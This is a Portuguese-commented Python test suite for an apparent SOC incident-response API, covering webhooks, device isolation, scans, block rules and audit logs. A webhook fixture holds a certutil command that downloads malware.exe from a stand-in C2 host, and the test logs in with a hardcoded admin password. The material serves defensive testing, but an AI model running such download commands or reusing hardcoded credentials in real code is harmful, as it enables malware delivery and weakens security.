"""
Suite de Testes Automatizados para a Central de Resposta Ativa e War Room do SOC
Testa endpoints de contenção, remediação, mitigação, regras, webhooks e streaming.
"""

from fastapi.testclient import TestClient
from app import app
import auth

def run_soc_tests():
    print("=" * 60)
    print("INICIANDO SUITE DE TESTES DO SOC WAR ROOM & RESPOSTA ATIVA")
    print("=" * 60)

    client = TestClient(app, follow_redirects=False)

    # 1. Autenticação com Administrador
    login_resp = client.post("/api/auth/login", json={"username_or_email": "admin", "password": "Admin@Acronis2026!"})
    assert login_resp.status_code == 200, f"Login falhou: {login_resp.text}"
    session_id = login_resp.cookies.get("cyber_session_id")
    client.cookies.set("cyber_session_id", session_id)
    print("[1] Login autenticado com sucesso no SOC.")

    # 2. Teste de Métricas Táticas
    tact_resp = client.get("/api/soc/tactical_metrics")
    assert tact_resp.status_code == 200, f"Erro em tactical_metrics: {tact_resp.text}"
    metrics = tact_resp.json()
    assert "total_incidents" in metrics
    assert "active_critical" in metrics
    assert "blocked_commands_count" in metrics
    print(f"[2] Métricas táticas OK: {metrics['total_incidents']} incidentes, {metrics['active_critical']} críticos ativos.")

    # 3. Teste de Listagem de Incidentes
    inc_resp = client.get("/api/soc/incidents?limit=10")
    assert inc_resp.status_code == 200
    inc_data = inc_resp.json()
    assert "incidents" in inc_data
    print(f"[3] Listagem de incidentes OK: {len(inc_data['incidents'])} retornados de {inc_data['total']} totais.")

    # 4. Teste de Ingestão via Webhook Acronis
    wh_payload = {
        "type": "EDRIncidentDetected",
        "id": "wh-test-9999",
        "title": "Ameaça EDR Detectada via Webhook Oficial",
        "severity": "critical",
        "details": {
            "resourceName": "SRV-TEST-WEBHOOK.corp",
            "resourceId": "res-srv-webhook-01",
            "ip": "10.0.0.50",
            "commandLine": "cmd.exe /c certutil.exe -urlcache -split -f http://test-c2.xyz/malware.exe C:\\Temp\\m.exe",
            "text": "Execução não autorizada de binário remoto impedida pelo agente Acronis."
        }
    }
    wh_resp = client.post("/api/webhooks/acronis", json=wh_payload)
    assert wh_resp.status_code == 200, f"Falha no webhook: {wh_resp.text}"
    print("[4] Ingestão via Webhook Acronis OK.")

    # 5. Teste de Consulta de Incidente Específico
    inc_check = client.get(f"/api/soc/incidents/wh-wh-test-9999")
    if inc_check.status_code == 200:
        inc_obj = inc_check.json()["incident"]
        assert "cmd.exe" in inc_obj.get("blocked_command", "")
        print("[5] Incidente injetado via Webhook verificado com extração forense do comando.")

    # 6. Teste de Atualização de Ciclo de Vida do Incidente (Status Workflow)
    status_update = client.patch(
        "/api/soc/incidents/wh-wh-test-9999/status",
        json={"status": "investigando", "notes": "Analista de SOC assumiu o caso para análise de memória."}
    )
    assert status_update.status_code == 200, f"Falha ao atualizar status: {status_update.text}"
    print("[6] Ciclo de vida do incidente atualizado para 'INVESTIGANDO'.")

    # 7. Teste de Resposta Ativa: Contenção (Isolamento de Rede)
    iso_resp = client.post(
        "/api/soc/devices/res-srv-webhook-01/isolate",
        json={"reason": "Isolamento preventivo devido a tentativa de download de mimikatz", "incident_id": "wh-wh-test-9999"}
    )
    assert iso_resp.status_code == 200, f"Falha no isolamento: {iso_resp.text}"
    iso_data = iso_resp.json()
    assert iso_data["isolated"] is True
    print("[7] Comando de contenção (Isolamento de Rede) executado com sucesso.")

    # 8. Teste de Resposta Ativa: Restauração de Rede (Desisolamento)
    uniso_resp = client.post("/api/soc/devices/res-srv-webhook-01/unisolate")
    assert uniso_resp.status_code == 200, f"Falha ao desisolar: {uniso_resp.text}"
    assert uniso_resp.json()["isolated"] is False
    print("[8] Conectividade de rede restaurada com sucesso.")

    # 9. Teste de Resposta Ativa: Remediação (Varredura Antivírus Remota)
    scan_resp = client.post(
        "/api/soc/devices/res-srv-webhook-01/scan",
        json={"scan_type": "full", "incident_id": "wh-wh-test-9999"}
    )
    assert scan_resp.status_code == 200, f"Falha na varredura: {scan_resp.text}"
    assert scan_resp.json()["status"] == "running"
    print(f"[9] Varredura antivírus remota (FULL) enfileirada: Task ID {scan_resp.json().get('task_id')}.")

    # 10. Teste de Mitigação: Forçar Execução de Plano de Proteção
    pol_run_resp = client.post(
        "/api/soc/policies/pol-001/trigger",
        json={"resource_ids": ["res-srv-webhook-01"]}
    )
    assert pol_run_resp.status_code == 200
    print("[10] Execução forçada de Plano de Proteção disparada.")

    # 11. Teste de Mitigação: Alternar Status de Plano de Proteção
    pol_toggle_resp = client.post(
        "/api/soc/policies/pol-001/toggle",
        json={"enabled": True}
    )
    assert pol_toggle_resp.status_code == 200
    print("[11] Alternância de status de Plano de Proteção OK.")

    # 12. Teste de Gerenciamento de Regras Globais de Bloqueio
    rule_add = client.post(
        "/api/soc/rules",
        json={
            "rule_type": "url",
            "rule_value": "http://test-c2.xyz/malware.exe",
            "action": "block",
            "description": "Bloqueio preventivo de repositório C2 mitigado pelo SOC"
        }
    )
    assert rule_add.status_code == 200, f"Falha ao adicionar regra: {rule_add.text}"
    rule_id = rule_add.json()["rule_id"]
    print(f"[12] Regra de bloqueio #{rule_id} adicionada.")

    rules_list = client.get("/api/soc/rules")
    assert rules_list.status_code == 200
    assert any(r["id"] == rule_id for r in rules_list.json()["rules"])
    print(f"[13] Listagem de regras confirmou presença da regra #{rule_id}.")

    rule_del = client.delete(f"/api/soc/rules/{rule_id}")
    assert rule_del.status_code == 200
    print(f"[14] Regra #{rule_id} removida com sucesso.")

    # 15. Teste de Trilha de Auditoria do SOC
    logs_resp = client.get("/api/soc/logs?limit=10")
    assert logs_resp.status_code == 200
    logs = logs_resp.json()["logs"]
    assert len(logs) >= 4
    print(f"[15] Trilha de auditoria contém {len(logs)} intervenções registradas com operador.")

    # 16. Teste de Configurações de E-mail e Throttling
    sett_resp = client.get("/api/soc/settings")
    assert sett_resp.status_code == 200
    settings = sett_resp.json()
    assert "throttle_cooldown_minutes" in settings
    print(f"[16] Configurações de alerta e e-mail verificadas (Throttling: {settings['throttle_cooldown_minutes']} min).")

    # 17. Teste de Disparo de E-mail de Teste
    test_mail = client.post("/api/soc/settings/test_email", json={"target_email": "admin@empresa.com.br"})
    assert test_mail.status_code == 200, f"Falha no teste de e-mail: {test_mail.text}"
    print(f"[17] E-mail de teste formatado e validado: '{test_mail.json()['message']}'")

    print("=" * 60)
    print("TODOS OS 17 TESTES DE RESPOSTA ATIVA DO SOC PASSARAM COM SUCESSO!")
    print("=" * 60)

if __name__ == "__main__":
    run_soc_tests()
